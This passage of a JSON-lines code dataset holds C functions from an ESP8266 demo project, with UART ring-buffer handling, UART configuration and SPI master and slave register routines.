"c", "size": 1288}
{"docstring": "//move data from uart fifo to rx buffer\n", "func_signal": "void Uart_rx_buff_enq()", "code": "{\n    uint8 fifo_len,buf_idx;\n    uint8 fifo_data;\n    #if 1\n    fifo_len = (READ_PERI_REG(UART_STATUS(UART0))>>UART_RXFIFO_CNT_S)&UART_RXFIFO_CNT;\n    if(fifo_len >= pRxBuffer->Space){\n        os_printf(\"buf full!!!\\n\\r\");            \n    }else{\n        buf_idx=0;\n        while(buf_idx < fifo_len){\n            buf_idx++;\n            fifo_data = READ_PERI_REG(UART_FIFO(UART0)) & 0xFF;\n            *(pRxBuffer->pInPos++) = fifo_data;\n            if(pRxBuffer->pInPos == (pRxBuffer->pUartBuff + pRxBuffer->UartBuffSize)){\n                pRxBuffer->pInPos = pRxBuffer->pUartBuff;\n            }            \n        }\n        pRxBuffer->Space -= fifo_len ;\n        if(pRxBuffer->Space >= UART_FIFO_LEN){\n            //os_printf(\"after rx enq buf enough\\n\\r\");\n            uart_rx_intr_enable(UART0);\n        }\n    }\n    #endif\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "//rx buffer dequeue\n", "func_signal": "uint16 ICACHE_FLASH_ATTR\nrx_buff_deq(char* pdata, uint16 data_len )", "code": "{\n    uint16 buf_len =  (pRxBuffer->UartBuffSize- pRxBuffer->Space);\n    uint16 tail_len = pRxBuffer->pUartBuff + pRxBuffer->UartBuffSize - pRxBuffer->pOutPos ;\n    uint16 len_tmp = 0;\n    len_tmp = ((data_len > buf_len)?buf_len:data_len);\n    if(pRxBuffer->pOutPos <= pRxBuffer->pInPos){\n        os_memcpy(pdata, pRxBuffer->pOutPos,len_tmp);\n        pRxBuffer->pOutPos+= len_tmp;\n        pRxBuffer->Space += len_tmp;\n    }else{\n        if(len_tmp>tail_len){\n            os_memcpy(pdata, pRxBuffer->pOutPos, tail_len);\n            pRxBuffer->pOutPos += tail_len;\n            pRxBuffer->pOutPos = (pRxBuffer->pUartBuff +  (pRxBuffer->pOutPos- pRxBuffer->pUartBuff) % pRxBuffer->UartBuffSize );\n            pRxBuffer->Space += tail_len;\n            \n            os_memcpy(pdata+tail_len , pRxBuffer->pOutPos, len_tmp-tail_len);\n            pRxBuffer->pOutPos+= ( len_tmp-tail_len );\n            pRxBuffer->pOutPos= (pRxBuffer->pUartBuff +  (pRxBuffer->pOutPos- pRxBuffer->pUartBuff) % pRxBuffer->UartBuffSize );\n            pRxBuffer->Space +=( len_tmp-tail_len);                \n        }else{\n            //os_printf(\"case 3 in rx deq\\n\\r\");\n            os_memcpy(pdata, pRxBuffer->pOutPos, len_tmp);\n            pRxBuffer->pOutPos += len_tmp;\n            pRxBuffer->pOutPos = (pRxBuffer->pUartBuff +  (pRxBuffer->pOutPos- pRxBuffer->pUartBuff) % pRxBuffer->UartBuffSize );\n            pRxBuffer->Space += len_tmp;\n        }\n    }\n    if(pRxBuffer->Space >= UART_FIFO_LEN){\n        uart_rx_intr_enable(UART0);\n    }\n    return len_tmp; \n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "//========================================================\n", "func_signal": "LOCAL void\nuart0_write_char(char c)", "code": "{\n    if (c == '\\n') {\n        uart_tx_one_char(UART0, '\\r');\n        uart_tx_one_char(UART0, '\\n');\n    } else if (c == '\\r') {\n    } else {\n        uart_tx_one_char(UART0, c);\n    }\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "/******************************************************************************\n * FunctionName : spi_master_init\n * Description  : SPI master initial function for common byte units transmission\n * Parameters   : uint8 spi_no - SPI module number, Only \"SPI\" and \"HSPI\" are valid\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\n    spi_master_init(uint8 spi_no)", "code": "{\n\tuint32 regvalue; \n\n\tif(spi_no>1) \t\treturn; //handle invalid input number\n\t\n\tSET_PERI_REG_MASK(SPI_USER(spi_no), SPI_CS_SETUP|SPI_CS_HOLD|SPI_USR_COMMAND);\n\tCLEAR_PERI_REG_MASK(SPI_USER(spi_no), SPI_FLASH_MODE);\n\n\tWRITE_PERI_REG(SPI_CLOCK(spi_no), \n\t\t\t\t\t((3&SPI_CLKCNT_N)<<SPI_CLKCNT_N_S)|\n\t\t\t\t\t((1&SPI_CLKCNT_H)<<SPI_CLKCNT_H_S)|\n\t\t\t\t\t((3&SPI_CLKCNT_L)<<SPI_CLKCNT_L_S)); //clear bit 31,set SPI clock div\n}", "path": "H03-spi_app\\driver\\spi.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "/******************************************************************************\n * FunctionName : uart_config\n * Description  : Internal used function\n *                UART0 used for data TX/RX, RX buffer size is 0x100, interrupt enabled\n *                UART1 just used for debug output\n * Parameters   : uart_no, use UART0 or UART1 defined ahead\n * Returns      : NONE\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuart_config(uint8 uart_no)", "code": "{\n    if (uart_no == UART1){\n        PIN_FUNC_SELECT(PERIPHS_IO_MUX_GPIO2_U, FUNC_U1TXD_BK);\n    }else{\n        /* rcv_buff size if 0x100 */\n        ETS_UART_INTR_ATTACH(uart0_rx_intr_handler,  &(UartDev.rcv_buff));\n        PIN_PULLUP_DIS(PERIPHS_IO_MUX_U0TXD_U);\n        PIN_FUNC_SELECT(PERIPHS_IO_MUX_U0TXD_U, FUNC_U0TXD);\n\t#if UART_HW_RTS\n        PIN_FUNC_SELECT(PERIPHS_IO_MUX_MTDO_U, FUNC_U0RTS);   //HW FLOW CONTROL RTS PIN\n        #endif\n\t#if UART_HW_CTS\n        PIN_FUNC_SELECT(PERIPHS_IO_MUX_MTCK_U, FUNC_U0CTS);   //HW FLOW CONTROL CTS PIN\n        #endif\n    }\n    uart_div_modify(uart_no, UART_CLK_FREQ / (UartDev.baut_rate));//SET BAUDRATE\n    \n    WRITE_PERI_REG(UART_CONF0(uart_no), ((UartDev.exist_parity & UART_PARITY_EN_M)  <<  UART_PARITY_EN_S) //SET BIT AND PARITY MODE\n                                                                        | ((UartDev.parity & UART_PARITY_M)  <<UART_PARITY_S )\n                                                                        | ((UartDev.stop_bits & UART_STOP_BIT_NUM) << UART_STOP_BIT_NUM_S)\n                                                                        | ((UartDev.data_bits & UART_BIT_NUM) << UART_BIT_NUM_S));\n    \n    //clear rx and tx fifo,not ready\n    SET_PERI_REG_MASK(UART_CONF0(uart_no), UART_RXFIFO_RST | UART_TXFIFO_RST);    //RESET FIFO\n    CLEAR_PERI_REG_MASK(UART_CONF0(uart_no), UART_RXFIFO_RST | UART_TXFIFO_RST);\n    \n    if (uart_no == UART0){\n        //set rx fifo trigger\n        WRITE_PERI_REG(UART_CONF1(uart_no),\n        ((100 & UART_RXFIFO_FULL_THRHD) << UART_RXFIFO_FULL_THRHD_S) |\n        #if UART_HW_RTS\n        ((110 & UART_RX_FLOW_THRHD) << UART_RX_FLOW_THRHD_S) |\n        UART_RX_FLOW_EN |   //enbale rx flow control\n        #endif\n        (0x02 & UART_RX_TOUT_THRHD) << UART_RX_TOUT_THRHD_S |\n        UART_RX_TOUT_EN|\n        ((0x10 & UART_TXFIFO_EMPTY_THRHD)<<UART_TXFIFO_EMPTY_THRHD_S));//wjl \n        #if UART_HW_CTS\n        SET_PERI_REG_MASK( UART_CONF0(uart_no),UART_TX_FLOW_EN);  //add this sentense to add a tx flow control via MTCK( CTS )\n        #endif\n        SET_PERI_REG_MASK(UART_INT_ENA(uart_no), UART_RXFIFO_TOUT_INT_ENA |UART_FRM_ERR_INT_ENA);\n    }else{\n        WRITE_PERI_REG(UART_CONF1(uart_no),((UartDev.rcv_buff.TrigLvl & UART_RXFIFO_FULL_THRHD) << UART_RXFIFO_FULL_THRHD_S));//TrigLvl default val == 1\n    }\n    //clear all interrupt\n    WRITE_PERI_REG(UART_INT_CLR(uart_no), 0xffff);\n    //enable rx_interrupt\n    SET_PERI_REG_MASK(UART_INT_ENA(uart_no), UART_RXFIFO_FULL_INT_ENA|UART_RXFIFO_OVF_INT_ENA);\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "/******************************************************************************\n * FunctionName : spi_mast_byte_write\n * Description  : SPI master 1 byte transmission function\n * Parameters   : \tuint8 spi_no - SPI module number, Only \"SPI\" and \"HSPI\" are valid\n *\t\t\t\tuint8 data- transmitted data\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\n    spi_mast_byte_write(uint8 spi_no,uint8 data)", "code": "{\n\tuint32 regvalue;\n\n\tif(spi_no>1) \t\treturn; //handle invalid input number\n\n\twhile(READ_PERI_REG(SPI_CMD(spi_no))&SPI_USR);\n\tCLEAR_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_MOSI|SPI_USR_MISO);\n\n\t//SPI_FLASH_USER2 bit28-31 is cmd length,cmd bit length is value(0-15)+1,\n\t// bit15-0 is cmd value.\n\tWRITE_PERI_REG(SPI_USER2(spi_no), \n\t\t\t\t\t((7&SPI_USR_COMMAND_BITLEN)<<SPI_USR_COMMAND_BITLEN_S)|((uint32)data));\n\tSET_PERI_REG_MASK(SPI_CMD(spi_no), SPI_USR);\n\twhile(READ_PERI_REG(SPI_CMD(spi_no))&SPI_USR);\t\n }  \n\n/******************************************************************************\n * FunctionName : spi_byte_write_espslave\n * Description  : SPI master 1 byte transmission function for esp8266 slave,\n * \t\t\ttransmit 1byte data to esp8266 slave buffer needs 16bit transmission ,\n * \t\t\tfirst byte is command 0x04 to write slave buffer, second byte is data\n * Parameters   : \tuint8 spi_no - SPI module number, Only \"SPI\" and \"HSPI\" are valid\n *\t\t\t\tuint8 data- transmitted data\n*******************************************************************************/\nvoid ICACHE_FLASH_ATTR\n    spi_byte_write_espslave(uint8 spi_no,uint8 data)\n {\n\tuint32 regvalue;\n\n\tif(spi_no>1) \t\treturn; //handle invalid input number\n\n\twhile(READ_PERI_REG(SPI_CMD(spi_no))&SPI_USR);\n\tSET_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_MOSI);\n\tCLEAR_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_MISO|SPI_USR_ADDR|SPI_USR_DUMMY);\n\n\t//SPI_FLASH_USER2 bit28-31 is cmd length,cmd bit length is value(0-15)+1,\n\t// bit15-0 is cmd value.\n\t//0x70000000 is for 8bits cmd, 0x04 is eps8266 slave write cmd value\n\tWRITE_PERI_REG(SPI_USER2(spi_no), \n\t\t\t\t\t((7&SPI_USR_COMMAND_BITLEN)<<SPI_USR_COMMAND_BITLEN_S)|4);\n\tWRITE_PERI_REG(SPI_W0(spi_no), (uint32)(data));\n\tSET_PERI_REG_MASK(SPI_CMD(spi_no), SPI_USR);\n }\n/******************************************************************************\n * FunctionName : spi_byte_read_espslave\n * Description  : SPI master 1 byte read function for esp8266 slave,\n * \t\t\tread 1byte data from esp8266 slave buffer needs 16bit transmission ,\n * \t\t\tfirst byte is command 0x06 to read slave buffer, second byte is recieved data\n * Parameters   : \tuint8 spi_no - SPI module number, Only \"SPI\" and \"HSPI\" are valid\n *\t\t\t\tuint8* data- recieved data address\n*******************************************************************************/\n  void ICACHE_FLASH_ATTR\n      spi_byte_read_espslave(uint8 spi_no,uint8 *data)\n {\n\tuint32 regvalue;\n\n\tif(spi_no>1) \t\treturn; //handle invalid input number\n\n\twhile(READ_PERI_REG(SPI_CMD(spi_no))&SPI_USR);\n\n\tSET_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_MISO);\n\tCLEAR_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_MOSI|SPI_USR_ADDR|SPI_USR_DUMMY);\n\t\t//SPI_FLASH_USER2 bit28-31 is cmd length,cmd bit length is value(0-15)+1,\n\t// bit15-0 is cmd value.\n\t//0x70000000 is for 8bits cmd, 0x06 is eps8266 slave read cmd value\n\tWRITE_PERI_REG(SPI_USER2(spi_no), \n\t\t\t\t\t((7&SPI_USR_COMMAND_BITLEN)<<SPI_USR_COMMAND_BITLEN_S)|6);\n\tSET_PERI_REG_MASK(SPI_CMD(spi_no), SPI_USR);\n\t\n\twhile(READ_PERI_REG(SPI_CMD(spi_no))&SPI_USR);\n\t*data=(uint8)(READ_PERI_REG(SPI_W0(spi_no))&0xff);\n }\n\n/******************************************************************************\n * FunctionName : spi_slave_init\n * Description  : SPI slave mode initial funtion, including mode setting,\n * \t\t\tIO setting, transmission interrupt opening, interrupt function registration\n * Parameters   : \tuint8 spi_no - SPI module number, Only \"SPI\" and \"HSPI\" are valid\n *\t\t\t\tuint8 data_len - read&write data pack length,using byte as unit,the range is 1-32\n*******************************************************************************/\nvoid ICACHE_FLASH_ATTR\n    spi_slave_init(uint8 spi_no,uint8 data_len)\n{\n    uint32 regvalue; \n    uint32 data_bit_len;\n    if(spi_no>1)\n        return; //handle invalid input number\n    if(data_len<=1) data_bit_len=7;\n    else if(data_len>=32) data_bit_len=0xff;\n    else\tdata_bit_len=(data_len<<3)-1;\n\n    //clear bit9,bit8 of reg PERIPHS_IO_MUX\n    //bit9 should be cleared when HSPI clock doesn't equal CPU clock\n    //bit8 should be cleared when SPI clock doesn't equal CPU clock\n    ////WRITE_PERI_REG(PERIPHS_IO_MUX, 0x105); //clear bit9//TEST\n    if(spi_no==SPI){\n        PIN_FUNC_SELECT(PERIPHS_IO_MUX_SD_CLK_U, 1);//configure io to spi mode\n        PIN_FUNC_SELECT(PERIPHS_IO_MUX_SD_CMD_U, 1);//configure io to spi mode\t\n        PIN_FUNC_SELECT(PERIPHS_IO_MUX_SD_DATA0_U, 1);//configure io to spi mode\t\n        PIN_FUNC_SELECT(PERIPHS_IO_MUX_SD_DATA1_U, 1);//configure io to spi mode\t\n    }else if(spi_no==HSPI){\n        PIN_FUNC_SELECT(PERIPHS_IO_MUX_MTDI_U, 2);//configure io to spi mode\n        PIN_FUNC_SELECT(PERIPHS_IO_MUX_MTCK_U, 2);//configure io to spi mode\t\n        PIN_FUNC_SELECT(PERIPHS_IO_MUX_MTMS_U, 2);//configure io to spi mode\t\n        PIN_FUNC_SELECT(PERIPHS_IO_MUX_MTDO_U, 2);//configure io to spi mode\t\n    }\n\n    //regvalue=READ_PERI_REG(SPI_FLASH_SLAVE(spi_no));\n    //slave mode,slave use buffers which are register \"SPI_FLASH_C0~C15\", enable trans done isr\n    //set bit 30 bit 29 bit9,bit9 is trans done isr mask\n    SET_PERI_REG_MASK(\tSPI_SLAVE(spi_no), \n    \t\t\t\t\t\tSPI_SLAVE_MODE|SPI_SLV_WR_RD_BUF_EN|\n                                         \tSPI_SLV_WR_BUF_DONE_EN|SPI_SLV_RD_BUF_DONE_EN|\n                                         \tSPI_SLV_WR_STA_DONE_EN|SPI_SLV_RD_STA_DONE_EN|\n                                         \tSPI_TRANS_DONE_EN);\n    //disable general trans intr \n    //CLEAR_PERI_REG_MASK(SPI_SLAVE(spi_no),SPI_TRANS_DONE_EN);\n\n    CLEAR_PERI_REG_MASK(SPI_USER(spi_no), SPI_FLASH_MODE);//disable flash operation mode\n    SET_PERI_REG_MASK(SPI_USER(spi_no),SPI_USR_MISO_HIGHPART);//SLAVE SEND DATA BUFFER IN C8-C15 \n\n\n//////**************RUN WHEN SLAVE RECIEVE*******************///////\n   //tow lines below is to configure spi timing.\n    SET_PERI_REG_MASK(SPI_CTRL2(spi_no),(0x2&SPI_MOSI_DELAY_NUM)<<SPI_MOSI_DELAY_NUM_S) ;//delay num\n    os_printf(\"SPI_CTRL2 is %08x\\n\",READ_PERI_REG(SPI_CTRL2(spi_no)));\n    WRITE_PERI_REG(SPI_CLOCK(spi_no), 0);\n\n\n    \n/////***************************************************//////\t\n\n    //set 8 bit slave command length, because slave must have at least one bit addr, \n    //8 bit slave+8bit addr, so master device first 2 bytes can be regarded as a command \n    //and the  following bytes are datas, \n    //32 bytes input wil be stored in SPI_FLASH_C0-C7\n    //32 bytes output data should be set to SPI_FLASH_C8-C15\n    WRITE_PERI_REG(SPI_USER2(spi_no), (0x7&SPI_USR_COMMAND_BITLEN)<<SPI_USR_COMMAND_BITLEN_S); //0x70000000\n\n    //set 8 bit slave recieve buffer length, the buffer is SPI_FLASH_C0-C7\n    //set 8 bit slave status register, which is the low 8 bit of register \"SPI_FLASH_STATUS\"\n    SET_PERI_REG_MASK(SPI_SLAVE1(spi_no),  ((data_bit_len&SPI_SLV_BUF_BITLEN)<< SPI_SLV_BUF_BITLEN_S)|\n                                                                                        ((0x7&SPI_SLV_STATUS_BITLEN)<<SPI_SLV_STATUS_BITLEN_S)|\n                                                                                       ((0x7&SPI_SLV_WR_ADDR_BITLEN)<<SPI_SLV_WR_ADDR_BITLEN_S)|\n                                                                                       ((0x7&SPI_SLV_RD_ADDR_BITLEN)<<SPI_SLV_RD_ADDR_BITLEN_S));\n    \n    SET_PERI_REG_MASK(SPI_PIN(spi_no),BIT19);//BIT19   \n\n    //maybe enable slave transmission liston \n    SET_PERI_REG_MASK(SPI_CMD(spi_no),SPI_USR);\n    //register level2 isr function, which contains spi, hspi and i2s events\n    ETS_SPI_INTR_ATTACH(spi_slave_isr_handler,NULL);\n    //enable level2 isr, which contains spi, hspi and i2s events\n    ETS_SPI_INTR_ENABLE(); \n}", "path": "H03-spi_app\\driver\\spi.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "/******************************************************************************\n * FunctionName : uart0_sendStr\n * Description  : use uart0 to transfer buffer\n * Parameters   : uint8 *buf - point to send buffer\n *                uint16 len - buffer len\n * Returns      :\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuart0_sendStr(const char *str)", "code": "{\n    while(*str){\n        uart_tx_one_char(UART0, *str++);\n    }\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "//copy uart buffer\n", "func_signal": "LOCAL void Uart_Buf_Cpy(struct UartBuffer* pCur, char* pdata , uint16 data_len)", "code": "{\n    if(data_len == 0) return ;\n    \n    uint16 tail_len = pCur->pUartBuff + pCur->UartBuffSize - pCur->pInPos ;\n    if(tail_len >= data_len){  //do not need to loop back  the queue\n        os_memcpy(pCur->pInPos , pdata , data_len );\n        pCur->pInPos += ( data_len );\n        pCur->pInPos = (pCur->pUartBuff +  (pCur->pInPos - pCur->pUartBuff) % pCur->UartBuffSize );\n        pCur->Space -=data_len;\n    }else{\n        os_memcpy(pCur->pInPos, pdata, tail_len);\n        pCur->pInPos += ( tail_len );\n        pCur->pInPos = (pCur->pUartBuff +  (pCur->pInPos - pCur->pUartBuff) % pCur->UartBuffSize );\n        pCur->Space -=tail_len;\n        os_memcpy(pCur->pInPos, pdata+tail_len , data_len-tail_len);\n        pCur->pInPos += ( data_len-tail_len );\n        pCur->pInPos = (pCur->pUartBuff +  (pCur->pInPos - pCur->pUartBuff) % pCur->UartBuffSize );\n        pCur->Space -=( data_len-tail_len);\n    }\n    \n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "/*test code*/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuart_init_2(UartBautRate uart0_br, UartBautRate uart1_br)", "code": "{\n    // rom use 74880 baut_rate, here reinitialize\n    UartDev.baut_rate = uart0_br;\n    UartDev.exist_parity = STICK_PARITY_EN;\n    UartDev.parity = EVEN_BITS;\n    UartDev.stop_bits = ONE_STOP_BIT;\n    UartDev.data_bits = EIGHT_BITS;\n\t\n    uart_config(UART0);\n    UartDev.baut_rate = uart1_br;\n    uart_config(UART1);\n    ETS_UART_INTR_ENABLE();\n\n    // install uart1 putc callback\n    os_install_putc1((void *)uart1_write_char);//print output at UART1\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "//fill the uart tx buffer\n", "func_signal": "void ICACHE_FLASH_ATTR\ntx_buff_enq(char* pdata, uint16 data_len )", "code": "{\n    CLEAR_PERI_REG_MASK(UART_INT_ENA(UART0), UART_TXFIFO_EMPTY_INT_ENA);\n\n    if(pTxBuffer == NULL){\n        DBG1(\"\\n\\rnull, create buffer struct\\n\\r\");\n        pTxBuffer = Uart_Buf_Init(UART_TX_BUFFER_SIZE);\n        if(pTxBuffer!= NULL){\n            Uart_Buf_Cpy(pTxBuffer ,  pdata,  data_len );\n        }else{\n            DBG1(\"uart tx MALLOC no buf \\n\\r\");\n        }\n    }else{\n        if(data_len <= pTxBuffer->Space){\n        Uart_Buf_Cpy(pTxBuffer ,  pdata,  data_len);\n        }else{\n            DBG1(\"UART TX BUF FULL!!!!\\n\\r\");\n        }\n    }\n    #if 0\n    if(pTxBuffer->Space <= URAT_TX_LOWER_SIZE){\n\t    set_tcp_block();        \n    }\n    #endif\n    SET_PERI_REG_MASK(UART_CONF1(UART0), (UART_TX_EMPTY_THRESH_VAL & UART_TXFIFO_EMPTY_THRHD)<<UART_TXFIFO_EMPTY_THRHD_S);\n    SET_PERI_REG_MASK(UART_INT_ENA(UART0), UART_TXFIFO_EMPTY_INT_ENA);\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "/******************************************************************************\n * FunctionName : uart_buf_free\n * Description  : deinit of the tx buffer\n * Parameters   : struct UartBuffer* pTxBuff - tx buffer struct pointer\n * Returns      : NONE\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuart_buf_free(struct UartBuffer* pBuff)", "code": "{\n    os_free(pBuff->pUartBuff);\n    os_free(pBuff);\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "/******************************************************************************\n * FunctionName : uart_tx_one_char_no_wait\n * Description  : uart tx a single char without waiting for fifo \n * Parameters   : uint8 uart - uart port\n *                uint8 TxChar - char to tx\n * Returns      : STATUS\n*******************************************************************************/\n", "func_signal": "STATUS uart_tx_one_char_no_wait(uint8 uart, uint8 TxChar)", "code": "{\n    uint8 fifo_cnt = (( READ_PERI_REG(UART_STATUS(uart))>>UART_TXFIFO_CNT_S)& UART_TXFIFO_CNT);\n    if (fifo_cnt < 126) {\n        WRITE_PERI_REG(UART_FIFO(uart) , TxChar);\n    }\n    return OK;\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "/******************************************************************************\n * FunctionName : spi_lcd_9bit_write\n * Description  : SPI 9bits transmission function for driving LCD TM035PDZV36\n * Parameters   : \tuint8 spi_no - SPI module number, Only \"SPI\" and \"HSPI\" are valid\n *\t\t\t\tuint8 high_bit - first high bit of the data, 0 is for \"0\",the other value 1-255 is for \"1\"\n *\t\t\t\tuint8 low_8bit- the rest 8bits of the data.\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\n    spi_lcd_9bit_write(uint8 spi_no,uint8 high_bit,uint8 low_8bit)", "code": "{\n\tuint32 regvalue;\n\tuint8 bytetemp;\n\tif(spi_no>1) \t\treturn; //handle invalid input number\n\t\n\tif(high_bit)\t\tbytetemp=(low_8bit>>1)|0x80;\n\telse\t\t\t\tbytetemp=(low_8bit>>1)&0x7f;\n\t\n\tregvalue= ((8&SPI_USR_COMMAND_BITLEN)<<SPI_USR_COMMAND_BITLEN_S)|((uint32)bytetemp);\t\t//configure transmission variable,9bit transmission length and first 8 command bit \n\tif(low_8bit&0x01) \tregvalue|=BIT15;        //write the 9th bit\n\twhile(READ_PERI_REG(SPI_CMD(spi_no))&SPI_USR);\t\t//waiting for spi module available\n\tWRITE_PERI_REG(SPI_USER2(spi_no), regvalue);\t\t\t\t//write  command and command length into spi reg\n\tSET_PERI_REG_MASK(SPI_CMD(spi_no), SPI_USR);\t\t//transmission start\n//\twhile(READ_PERI_REG(SPI_CMD(spi_no))&SPI_USR);\t\n}", "path": "H03-spi_app\\driver\\spi.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "/******************************************************************************\n * FunctionName : uart1_sendStr_no_wait\n * Description  : uart tx a string without waiting for every char, used for print debug info which can be lost\n * Parameters   : const char *str - string to be sent\n * Returns      : NONE\n*******************************************************************************/\n", "func_signal": "void uart1_sendStr_no_wait(const char *str)", "code": "{\n    while(*str){\n        uart_tx_one_char_no_wait(UART1, *str++);\n    }\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "/******************************************************************************\n * FunctionName : Uart_Buf_Init\n * Description  : tx buffer enqueue: fill a first linked buffer \n * Parameters   : char *pdata - data point  to be enqueue\n * Returns      : NONE\n*******************************************************************************/\n", "func_signal": "struct UartBuffer* ICACHE_FLASH_ATTR\nUart_Buf_Init(uint32 buf_size)", "code": "{\n    uint32 heap_size = system_get_free_heap_size();\n    if(heap_size <=buf_size){\n        DBG1(\"no buf for uart\\n\\r\");\n        return NULL;\n    }else{\n        DBG(\"test heap size: %d\\n\\r\",heap_size);\n        struct UartBuffer* pBuff = (struct UartBuffer* )os_malloc(sizeof(struct UartBuffer));\n        pBuff->UartBuffSize = buf_size;\n        pBuff->pUartBuff = (uint8*)os_malloc(pBuff->UartBuffSize);\n        pBuff->pInPos = pBuff->pUartBuff;\n        pBuff->pOutPos = pBuff->pUartBuff;\n        pBuff->Space = pBuff->UartBuffSize;\n        pBuff->BuffState = OK;\n        pBuff->nextBuff = NULL;\n        pBuff->TcpControl = RUN;\n        return pBuff;\n    }\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "///////\n", "func_signal": "uart_recvTask(os_event_t *events)", "code": "{\n    if(events->sig == 0){\n    #if  UART_BUFF_EN  \n        Uart_rx_buff_enq();\n    #else\n        uint8 fifo_len = (READ_PERI_REG(UART_STATUS(UART0))>>UART_RXFIFO_CNT_S)&UART_RXFIFO_CNT;\n        uint8 d_tmp = 0;\n        uint8 idx=0;\n        for(idx=0;idx<fifo_len;idx++) {\n            d_tmp = READ_PERI_REG(UART_FIFO(UART0)) & 0xFF;\n            uart_tx_one_char(UART0, d_tmp);\n        }\n        WRITE_PERI_REG(UART_INT_CLR(UART0), UART_RXFIFO_FULL_INT_CLR|UART_RXFIFO_TOUT_INT_CLR);\n        uart_rx_intr_enable(UART0);\n    #endif\n    }else if(events->sig == 1){\n    #if UART_BUFF_EN\n\t //already move uart buffer output to uart empty interrupt\n        //tx_start_uart_buffer(UART0);\n    #else \n    \n    #endif\n    }\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "//os_printf output to fifo or to the tx buffer\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuart0_write_char_no_wait(char c)", "code": "{\n#if UART_BUFF_EN    //send to uart0 fifo but do not wait \n    uint8 chr;\n    if (c == '\\n'){\n        chr = '\\r';\n        tx_buff_enq(&chr, 1);\n        chr = '\\n';\n        tx_buff_enq(&chr, 1);\n    }else if (c == '\\r'){\n    \n    }else{\n        tx_buff_enq(&c,1);\n    }\n#else //send to uart tx buffer\n    if (c == '\\n'){\n        uart_tx_one_char_no_wait(UART0, '\\r');\n        uart_tx_one_char_no_wait(UART0, '\\n');\n    }else if (c == '\\r'){\n    \n    }\n    else{\n        uart_tx_one_char_no_wait(UART0, c);\n    }\n#endif\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
{"docstring": "/******************************************************************************\n * FunctionName : uart0_tx_buffer\n * Description  : use uart0 to transfer buffer\n * Parameters   : uint8 *buf - point to send buffer\n *                uint16 len - buffer len\n * Returns      :\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuart0_tx_buffer(uint8 *buf, uint16 len)", "code": "{\n    uint16 i;\n    for (i = 0; i < len; i++)\n    {\n        uart_tx_one_char(UART0, buf[i]);\n    }\n}", "path": "H03-spi_app\\driver\\uart.c", "repo_name": "AngelLiang/ESP8266-Demos", "stars": 215, "license": "mit", "language": "c", "size": 1288}
